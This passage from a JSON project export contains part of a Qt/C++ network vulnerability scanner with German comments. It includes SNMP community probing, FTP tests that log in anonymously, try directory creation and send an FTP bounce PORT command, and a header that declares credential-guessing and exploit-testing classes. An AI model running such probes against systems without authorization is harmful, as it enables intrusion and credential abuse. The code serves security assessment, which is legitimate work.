snmpRequest.append(char(0xa0)); // GetRequest\r\n    snmpRequest.append(char(0x0c)); // Length\r\n    snmpRequest.append(char(0x02)); snmpRequest.append(char(0x01)); snmpRequest.append(char(0x01)); // Request ID\r\n    snmpRequest.append(char(0x02)); snmpRequest.append(char(0x01)); snmpRequest.append(char(0x00)); // Error Status\r\n    snmpRequest.append(char(0x02)); snmpRequest.append(char(0x01)); snmpRequest.append(char(0x00)); // Error Index\r\n    snmpRequest.append(char(0x30)); snmpRequest.append(char(0x00)); // VarBindList (empty)\r\n\r\n    // Sende SNMP Request\r\n    qint64 bytesWritten = udpSocket.writeDatagram(snmpRequest, QHostAddress(ip), port);\r\n    if (bytesWritten == -1) return false;\r\n\r\n    // Warte auf Response\r\n    if (udpSocket.waitForReadyRead(3000)) {\r\n        QByteArray response;\r\n        response.resize(udpSocket.pendingDatagramSize());\r\n        udpSocket.readDatagram(response.data(), response.size());\r\n\r\n        // Check für SNMP Response\r\n        if (response.size() > 10 && (unsigned char)response[0] == 0x30) {\r\n            // SNMP Response empfangen - Community String funktioniert\r\n            return true;\r\n        }\r\n    }\r\n\r\n    return false;\r\n}\r\n\r\n// Service-specific vulnerability tests\r\nbool VulnerabilityScanner::testFTPVulnerabilities(const QString &ip)\r\n{\r\n    if (!connectToService(ip, 21, 2000)) return false;\r\n\r\n    QTcpSocket socket;\r\n    socket.connectToHost(ip, 21, QIODevice::ReadWrite);\r\n\r\n    if (!socket.waitForConnected(3000)) return false;\r\n\r\n    // FTP Banner auslesen\r\n    if (!socket.waitForReadyRead(3000)) {\r\n        socket.disconnectFromHost();\r\n        return false;\r\n    }\r\n\r\n    QString banner = QString::fromUtf8(socket.readAll());\r\n\r\n    // Test 1: Bekannte vulnerable FTP-Versionen\r\n    QStringList vulnerableVersions = {\r\n        \"vsftpd 2.3.4\",     // Backdoor vulnerability\r\n        \"ProFTPD 1.3.3\",    // Multiple vulnerabilities\r\n        \"Wu-FTPD\",          // Various vulnerabilities\r\n        \"Pure-FTPd 1.0.1\",  // Format string vulnerability\r\n        \"FileZilla Server 0.9.60\", // Multiple issues\r\n        \"Microsoft FTP Service 5.0\", // IIS 5.0 issues\r\n        \"ProFTPD 1.2.\"      // Various old versions\r\n    };\r\n\r\n    for (const QString &vuln : vulnerableVersions) {\r\n        if (banner.contains(vuln, Qt::CaseInsensitive)) {\r\n            socket.disconnectFromHost();\r\n            return true;\r\n        }\r\n    }\r\n\r\n    // Test 2: Anonymous FTP mit Write-Zugriff\r\n    socket.write(\"USER anonymous\\r\\n\");\r\n    socket.flush();\r\n\r\n    if (socket.waitForReadyRead(2000)) {\r\n        socket.readAll(); // Clear buffer\r\n        socket.write(\"PASS anonymous@test.com\\r\\n\");\r\n        socket.flush();\r\n\r\n        if (socket.waitForReadyRead(2000)) {\r\n            QString response = QString::fromUtf8(socket.readAll());\r\n            if (response.startsWith(\"230\")) {\r\n                // Test WRITE permissions\r\n                socket.write(\"MKD testdir\\r\\n\");\r\n                socket.flush();\r\n                if (socket.waitForReadyRead(2000)) {\r\n                    QString mkdResponse = QString::fromUtf8(socket.readAll());\r\n                    if (mkdResponse.startsWith(\"257\")) {\r\n                        // Write-Zugriff möglich - kritische Vulnerability\r\n                        socket.write(\"RMD testdir\\r\\n\"); // Cleanup\r\n                        socket.flush();\r\n                        socket.disconnectFromHost();\r\n                        return true;\r\n                    }\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    // Test 3: FTP Bounce Attack möglich\r\n    socket.write(\"PORT 127,0,0,1,0,22\\r\\n\"); // Port command zu localhost:22\r\n    socket.flush();\r\n    if (socket.waitForReadyRead(2000)) {\r\n        QString portResponse = QString::fromUtf8(socket.readAll());\r\n        if (portResponse.startsWith(\"200\")) {\r\n            socket.disconnectFromHost();\r\n            return true; // FTP Bounce möglich\r\n        }\r\n    }\r\n\r\n    socket.disconnectFromHost();\r\n    return false;\r\n}\r\n\r\n\r\n",
          "relativePath": "vulnerabilityscanner.cpp"
        },
        {
          "name": "vulnerabilityscanner.h",
          "type": "file",
          "content": "//===============================================================================\r\n// FIXED vulnerabilityscanner.h - Add missing includes and function declarations\r\n//===============================================================================\r\n\r\n#ifndef VULNERABILITYSCANNER_H\r\n#define VULNERABILITYSCANNER_H\r\n\r\n#include <QtCore/QObject>\r\n#include <QtCore/QRunnable>\r\n#include <QtCore/QThread>\r\n#include <QtCore/QElapsedTimer>\r\n#include <QtCore/QDateTime>\r\n#include <QtCore/QJsonObject>\r\n#include <QtCore/QJsonArray>\r\n#include <QtCore/QStringList>\r\n#include <QtCore/QMap>\r\n#include <QtCore/QTimer>\r\n#include <QtNetwork/QTcpSocket>\r\n#include <QtNetwork/QSslSocket>\r\n#include <QtNetwork/QSslCertificate>\r\n#include <QtNetwork/QSslCipher>        // *** FIXED: Added missing include ***\r\n#include <QtNetwork/QSslError>\r\n#include <QtNetwork/QHostInfo>\r\n#include <QtCore/QRegularExpression>\r\n#include <QtCore/QCryptographicHash>\r\n\r\n// Vulnerability severity levels\r\nenum class VulnSeverity {\r\n    CRITICAL = 5,\r\n    HIGH = 4,\r\n    MEDIUM = 3,\r\n    LOW = 2,\r\n    INFO = 1\r\n};\r\n\r\n// Vulnerability information structure\r\nstruct VulnerabilityInfo {\r\n    QString id;                 // CVE-ID or custom ID\r\n    QString title;              // Vulnerability title\r\n    QString description;        // Detailed description\r\n    VulnSeverity severity;      // Severity level\r\n    QString service;            // Affected service\r\n    int port;                   // Affected port\r\n    QString evidence;           // Proof of vulnerability\r\n    QString recommendation;     // Fix recommendation\r\n    QDateTime discovered;       // When found\r\n    QString cveScore;          // CVSS score if available\r\n    QStringList references;     // Related links/CVEs\r\n    bool exploitable;          // Can be exploited\r\n    QString exploitMethod;     // How to exploit\r\n};\r\n\r\n// Security assessment summary\r\nstruct SecurityAssessment {\r\n    QString targetIp;\r\n    QString hostname;\r\n    QDateTime scanTime;\r\n    int totalVulnerabilities;\r\n    int criticalCount;\r\n    int highCount;\r\n    int mediumCount;\r\n    int lowCount;\r\n    int infoCount;\r\n    QList<VulnerabilityInfo> vulnerabilities;\r\n    QString overallRisk;       // CRITICAL, HIGH, MEDIUM, LOW\r\n    int securityScore;         // 0-100 score\r\n    QStringList openPorts;\r\n    QStringList runningServices;\r\n    bool hasWeakCredentials;\r\n    bool hasUnencryptedServices;\r\n    bool hasOutdatedSoftware;\r\n    QString operatingSystem;\r\n};\r\n\r\n// Main Vulnerability Scanner Worker\r\nclass VulnerabilityScanner : public QObject, public QRunnable\r\n{\r\n    Q_OBJECT\r\n\r\npublic:\r\n    explicit VulnerabilityScanner(const QString &targetIp, QObject *parent = nullptr);\r\n    explicit VulnerabilityScanner(const QStringList &targetIps, QObject *parent = nullptr);\r\n\r\n    void run() override;\r\n\r\n    // Configuration methods\r\n    void setPortRange(const QList<int> &ports);\r\n    void enableCredentialTesting(bool enable);\r\n    void enableSSLTesting(bool enable);\r\n    void enableServiceTesting(bool enable);\r\n    void setTimeout(int timeoutMs);\r\n    void setThreadSafe(bool threadSafe);\r\n\r\nsignals:\r\n    // Progress signals\r\n    void scanStarted(const QString &target);\r\n    void scanProgress(const QString &target, int percentage);\r\n    void scanCompleted(const QString &target);\r\n\r\n    // Vulnerability discovery signals\r\n    void vulnerabilityFound(const QString &target, const VulnerabilityInfo &vuln);\r\n    void assessmentComplete(const SecurityAssessment &assessment);\r\n\r\n    // Detailed test results\r\n    void portScanComplete(const QString &target, const QStringList &openPorts);\r\n    void serviceScanComplete(const QString &target, const QMap<int, QString> &services);\r\n    void credentialTestComplete(const QString &target, const QStringList &weakCredentials);\r\n    void sslTestComplete(const QString &target, const QList<VulnerabilityInfo> &sslVulns);\r\n\r\n    // Status updates\r\n    void statusUpdate(const QString &target, const QString &message);\r\n    void errorOccurred(const QString &target, const QString &error);\r\n\r\nprivate slots:\r\n    void handleSslErrors(const QList<QSslError> &errors);\r\n\r\nprivate:\r\n    // Core scanning methods\r\n    void scanSingleTarget(const QString &ip);\r\n    SecurityAssessment performComprehensiveScan(const QString &ip);\r\n\r\n    // Service discovery\r\n    QStringList discoverOpenPorts(const QString &ip);\r\n    QMap<int, QString> identifyServices(const QString &ip, const QStringList &ports);\r\n    QString detectOperatingSystem(const QString &ip);\r\n\r\n    // Vulnerability testing modules\r\n    QList<VulnerabilityInfo> testCommonVulnerabilities(const QString &ip);\r\n    QList<VulnerabilityInfo> testSSLVulnerabilities(const QString &ip, int port = 443);\r\n    QList<VulnerabilityInfo> testWeakCredentials(const QString &ip);\r\n    QList<VulnerabilityInfo> testServiceVulnerabilities(const QString &ip, const QMap<int, QString> &services);\r\n    QList<VulnerabilityInfo> testNetworkVulnerabilities(const QString &ip);\r\n\r\n    // *** FIXED: Added missing SSL vulnerability test declarations ***\r\n    bool testHeartbleed(const QString &ip, int port);                    // Fixed return type\r\n    bool testPoodleSSL(const QString &ip, int port);\r\n    bool testWeakSSLCiphers(const QString &ip, int port);\r\n    bool testExpiredCertificates(const QString &ip, int port);\r\n    bool testSelfSignedCertificates(const QString &ip, int port);\r\n    bool testSSLv2Support(const QString &ip, int port);                 // Added missing declaration\r\n    bool testSSLv3Support(const QString &ip, int port);                 // Added missing declaration\r\n    bool testTLS10Support(const QString &ip, int port);                 // Added missing declaration\r\n\r\n    // *** FIXED: Added missing credential testing declarations ***\r\n    bool testDefaultCredentials(const QString &ip, int port, const QString &service);\r\n    bool testWeakPasswords(const QString &ip, int port, const QString &service);\r\n    bool testAnonymousAccess(const QString &ip, int port, const QString &service);\r\n\r\n    // Service-specific credential testing - Added missing declarations\r\n    bool testSSHCredentials(const QString &ip, int port, const QString &user, const QString &pass);\r\n    bool testFTPCredentials(const QString &ip, int port, const QString &user, const QString &pass);\r\n    bool testTelnetCredentials(const QString &ip, int port, const QString &user, const QString &pass);\r\n    bool testSMBCredentials(const QString &ip, int port, const QString &user, const QString &pass);\r\n    bool testHTTPCredentials(const QString &ip, int port, const QString &user, const QString &pass);\r\n    bool testSNMPCommunity(const QString &ip, int port, const QString &community);\r\n\r\n    // Service-specific tests\r\n    bool testSMBVulnerabilities(const QString &ip);\r\n    bool testFTPVulnerabilities(const QString &ip);\r\n    bool testSSHVulnerabilities(const QString &ip);\r\n    bool testHTTPVulnerabilities(const QString &ip, int port);\r\n    bool testSNMPVulnerabilities(const QString &ip);\r\n    bool testDNSVulnerabilities(const QString &ip);\r\n\r\n    // Utility methods\r\n    QString calculateSecurityScore(const QList<VulnerabilityInfo> &vulnerabilities);\r\n    QString determineOverallRisk(const QList<VulnerabilityInfo> &vulnerabilities);\r\n    VulnerabilityInfo createVulnerability(const QString &id, const QString &title,\r\n                                          VulnSeverity severity, const QString &service,\r\n                                          int port, const QString &evidence);\r\n    bool connectToService(const QString &ip, int port, int timeout = 3000);\r\n    QString grabServiceBanner(const QString &ip, int port);\r\n    bool sendCommand(QTcpSocket *socket, const QString &command, QString &response);\r\n\r\n    // Data members\r\n    QStringList targetIps;\r\n    QList<int> portRange;\r\n    bool enableCredentialTests;\r\n    bool enableSSLTests;\r\n    bool enableServiceTests;\r\n    int connectionTimeout;\r\n    bool threadSafeMode;\r\n\r\n    // Default port ranges for common services\r\n    static const QMap<QString, QList<int>> commonServicePorts;\r\n    static const QMap<QString, QStringList> defaultCredentials;\r\n    static const QStringList weakPasswords;\r\n    static const QStringList commonUsernames;\r\n};\r\n\r\n// SSL/TLS specific vulnerability scanner\r\nclass SSLVulnerabilityScanner : public QObject, public QRunnable\r\n{\r\n    Q_OBJECT\r\n\r\npublic:\r\n    explicit SSLVulnerabilityScanner(const QString &ip, int port = 443, QObject *parent = nullptr);\r\n    void run() override;\r\n\r\nsignals:\r\n    void sslVulnerabilityFound(const QString &ip, int port, const VulnerabilityInfo &vuln);\r\n    void sslScanComplete(const QString &ip, int port, const QList<VulnerabilityInfo> &vulnerabilities);\r\n\r\nprivate:\r\n    QString targetIp;\r\n    int targetPort;\r\n\r\n    // SSL-specific tests\r\n    bool testSSLv2Support(const QString &ip, int port);\r\n    bool testSSLv3Support(const QString &ip, int port);\r\n    bool testTLS10Support(const QString &ip, int port);\r\n    bool testWeakCiphers(const QString &ip, int port);\r\n    bool testCertificateValidation(const QString &ip, int port);\r\n    QStringList getAvailableCiphers(const QString &ip, int port);\r\n    QSslCertificate getCertificate(const QString &ip, int port);\r\n};\r\n\r\n// Credential testing module\r\nclass CredentialTester : public QObject, public QRunnable\r\n{\r\n    Q_OBJECT\r\n\r\npublic:\r\n    explicit CredentialTester(const QString &ip, const QString &service, int port, QObject *parent = nullptr);\r\n    void run() override;\r\n\r\n    void addCredentialPair(const QString &username, const QString &password);\r\n    void loadCommonCredentials();\r\n\r\nsignals:\r\n    void credentialFound(const QString &ip, int port, const QString &service,\r\n                         const QString &username, const QString &password);\r\n    void credentialTestComplete(const QString &ip, int port, int testedCount, int foundCount);\r\n\r\nprivate:\r\n    QString targetIp;\r\n    QString serviceName;\r\n    int targetPort;\r\n    QList<QPair<QString, QString>> credentials;\r\n\r\n    // Service-specific credential testing\r\n    bool testSSHCredentials(const QString &ip, int port, const QString &user, const QString &pass);\r\n    bool testFTPCredentials(const QString &ip, int port, const QString &user, const QString &pass);\r\n    bool testTelnetCredentials(const QString &ip, int port, const QString &user, const QString &pass);\r\n    bool testSMBCredentials(const QString &ip, int port, const QString &user, const QString &pass);\r\n    bool testHTTPCredentials(const QString &ip, int port, const QString &user, const QString &pass);\r\n    bool testSNMPCommunity(const QString &ip, int port, const QString &community);\r\n};\r\n\r\n// Exploit testing module (ethical testing only)\r\nclass ExploitTester : public QObject, public QRunnable\r\n{\r\n    Q_OBJECT\r\n\r\npublic:\r\n    explicit ExploitTester(const QString &ip, const VulnerabilityInfo &vulnerability, QObject *parent = nullptr);\r\n    void run() override;\r\n\r\nsignals:\r\n    void exploitTestResult(const QString &ip, const QString &vulnId, bool exploitable, const QString &proof);\r\n\r\nprivate:\r\n    QString targetIp;\r\n    VulnerabilityInfo targetVuln;\r\n\r\n    // Safe exploit testing methods\r\n    bool testBufferOverflow(const QString &ip, int port);\r\n    bool testSQLInjection(const QString &ip, int port);\r\n    bool testDirectoryTraversal(const QString &ip, int port);\r\n    bool testCommandInjection(const QString &ip, int port);\r\n};\r\n\r\n// Vulnerability database and knowledge base\r\nclass VulnerabilityDatabase : public QObject\r\n{\r\n    Q_OBJECT\r\n\r\npublic:\r\n    static VulnerabilityDatabase* instance();\r\n\r\n    // Vulnerability lookup\r\n    VulnerabilityInfo lookupVulnerability(const QString &cveId);\r\n    QList<VulnerabilityInfo> getVulnerabilitiesForService(const QString &service, const QString &version);\r\n\r\n    // Database management\r\n    void updateDatabase();\r\n    void loadLocalDatabase();\r\n    void addCustomVulnerability(const VulnerabilityInfo &vuln);\r\n\r\n    // Pattern matching for known vulnerabilities\r\n    QList<VulnerabilityInfo> matchBannerVulnerabilities(const QString &banner);\r\n    QList<VulnerabilityInfo> matchVersionVulnerabilities(const QString &service, const QString &version);\r\n\r\nsignals:\r\n    void databaseUpdated();\r\n    void updateProgress(int percentage);\r\n\r\nprivate:\r\n    explicit VulnerabilityDatabase(QObject *parent = nullptr);\r\n    static VulnerabilityDatabase *m_instance;\r\n\r\n    QMap<QString, VulnerabilityInfo> vulnerabilityMap;\r\n    QMap<QString, QStringList> serviceVulnerabilities;\r\n\r\n    void initializeDefaultVulnerabilities();\r\n    void loadCVEDatabase();\r\n};\r\n\r\n#endif // VULNERABILITYSCANNER_H\r\n\r\n",
          "relativePath": "vulnerabilityscanner.h"
        }
      ],
      "relativePath": "."
    }
  ],
  "mainFiles": [
    "exploitsystem.cpp",
    "ipscanner.cpp",
    "main.cpp",
    "mainwindow.cpp",
    "processmonitor.cpp"
  ],
  "testFiles": [],
  "buildInstructions": "make\n# oder: g++ -o app *.cpp",
  "runInstructions": "./app\n# Tests: make test",
  "hints": [],
  "author": "project-uploader",
  "createdAt": "2025-06-25T12:36:00.846Z",
  "status": "approved",
  "type": "project"
}
